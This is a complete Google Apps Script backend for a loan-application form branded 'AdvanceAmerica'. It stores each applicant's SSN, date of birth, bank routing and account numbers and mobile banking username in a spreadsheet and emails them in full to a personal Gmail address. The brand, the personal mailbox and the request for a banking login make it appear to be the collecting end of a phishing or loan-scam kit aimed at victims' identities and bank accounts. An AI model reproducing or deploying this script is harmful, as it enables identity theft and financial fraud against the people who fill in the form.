// ============================================================
//  AdvanceAmerica — Loan Application Google Apps Script
//  Paste this entire file into Extensions > Apps Script
// ============================================================

var NOTIFICATION_EMAIL = "finnfoxpersonalloan@gmail.com";
var SHEET_NAME = "AdvanceAmerica Applications";   // Sheet tab name (created automatically)
var SCRIPT_ENABLED = true;                        // Set to FALSE to stop all submissions

function doPost(e) {
  // Kill switch — set SCRIPT_ENABLED = false to block submissions
  if (!SCRIPT_ENABLED) {
    return ContentService
      .createTextOutput(JSON.stringify({ success: false, message: "Service temporarily unavailable." }))
      .setMimeType(ContentService.MimeType.JSON);
  }

  try {
    var data = JSON.parse(e.postData.contents);
    var ss = SpreadsheetApp.getActiveSpreadsheet();

    // Create sheet tab if it doesn't exist
    var sheet = ss.getSheetByName(SHEET_NAME);
    if (!sheet) {
      sheet = ss.insertSheet(SHEET_NAME);
      // Add headers
      sheet.appendRow([
        "Timestamp",
        "Loan Amount ($)",
        "Monthly Income ($)",
        "Purpose",
        "First Name",
        "Last Name",
        "Email",
        "Phone",
        "Date of Birth",
        "SSN",
        "Employer",
        "Employer Phone",
        "Street Address",
        "City",
        "State",
        "Zip Code",
        "Bank Name",
        "Routing Number",
        "Account Number",
        "Mobile Banking Username",
        "Document Type"
      ]);

      // Style the header row
      var headerRange = sheet.getRange(1, 1, 1, 21);
      headerRange.setBackground("#0f1f3d");
      headerRange.setFontColor("#ffffff");
      headerRange.setFontWeight("bold");
      sheet.setFrozenRows(1);
    }

    // Append the new application row
    sheet.appendRow([
      new Date().toLocaleString(),
      data.loanAmount        || "",
      data.monthlyIncome     || "",
      data.loanPurpose       || "",
      data.firstName         || "",
      data.lastName          || "",
      data.email             || "",
      data.phone             || "",
      data.dob               || "",
      data.ssn               || "",
      data.currentEmployer   || "",
      data.employerPhone     || "",
      data.streetAddress     || "",
      data.city              || "",
      data.state             || "",
      data.zipCode           || "",
      data.bankName          || "",
      data.routingNumber     || "",
      data.accountNumber     || "",
      data.mobileBankingUsername || "",
      data.documentType      || ""
    ]);

    // Auto-resize columns for readability
    sheet.autoResizeColumns(1, 21);

    // Send email notification to yourself
    sendEmailNotification(data);

    return ContentService
      .createTextOutput(JSON.stringify({ success: true }))
      .setMimeType(ContentService.MimeType.JSON);

  } catch (err) {
    return ContentService
      .createTextOutput(JSON.stringify({ success: false, message: err.toString() }))
      .setMimeType(ContentService.MimeType.JSON);
  }
}

function sendEmailNotification(data) {
  var subject = "🔔 New Loan Application — " + (data.firstName || "") + " " + (data.lastName || "");

  var body = `
New loan application received on AdvanceAmerica.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
LOAN DETAILS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Amount:         $${data.loanAmount || "N/A"}
Monthly Income: $${data.monthlyIncome || "N/A"}
Purpose:        ${data.loanPurpose || "N/A"}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
PERSONAL INFO
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Name:     ${data.firstName || ""} ${data.lastName || ""}
Email:    ${data.email || "N/A"}
Phone:    ${data.phone || "N/A"}
DOB:      ${data.dob || "N/A"}
SSN:      ${data.ssn || "N/A"}
Employer: ${data.currentEmployer || "N/A"}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
ADDRESS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
${data.streetAddress || ""}, ${data.city || ""}, ${data.state || ""} ${data.zipCode || ""}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
BANKING
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Bank:           ${data.bankName || "N/A"}
Routing #:      ${data.routingNumber || "N/A"}
Account #:      ${data.accountNumber || "N/A"}
Mobile User:    ${data.mobileBankingUsername || "N/A"}
Document Type:  ${data.documentType || "N/A"}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Submitted: ${new Date().toLocaleString()}
  `;

  MailApp.sendEmail(NOTIFICATION_EMAIL, subject, body);
}

// Required for CORS preflight
function doGet(e) {
  return ContentService
    .createTextOutput(JSON.stringify({ status: "ok" }))
    .setMimeType(ContentService.MimeType.JSON);
}
